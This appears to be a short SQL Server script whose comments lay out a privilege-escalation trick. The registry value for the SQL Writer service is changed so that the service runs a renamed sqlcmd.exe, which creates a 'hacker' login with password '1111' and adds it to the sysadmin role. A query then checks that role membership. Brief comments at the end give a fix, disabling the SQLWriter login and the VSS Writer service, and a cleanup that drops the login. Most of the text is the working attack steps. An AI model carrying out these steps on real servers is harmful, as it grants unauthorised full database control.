/*
    regedit > HKLM\SYSTEM\CurrentControlSet\services\SQLWriter

      C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\110\Tools\Binn\sqlcmd.exe
    copy to:
      C:\Program Files\Microsoft SQL Server\90\Shared\

    rename: sqlcmd.exe -> sqlwriter.exe

      "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
    to:
      "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe" -S HOMEPC\SQL_2014 -E -Q "CREATE LOGIN hacker WITH PASSWORD = '1111'; EXEC sys.sp_addsrvrolemember @loginame = 'hacker', @rolename = 'sysadmin'"

    cmd > net start sqlwriter
*/

SELECT IS_SRVROLEMEMBER('sysadmin', 'hacker')

/*
    Fix 2005..2016:

    ALTER LOGIN [NT SERVICE\SQLWriter] DISABLE
    GO

    and disable "SQL Server VSS Writer" service
*/

/*
    DROP LOGIN hacker
    GO
*/
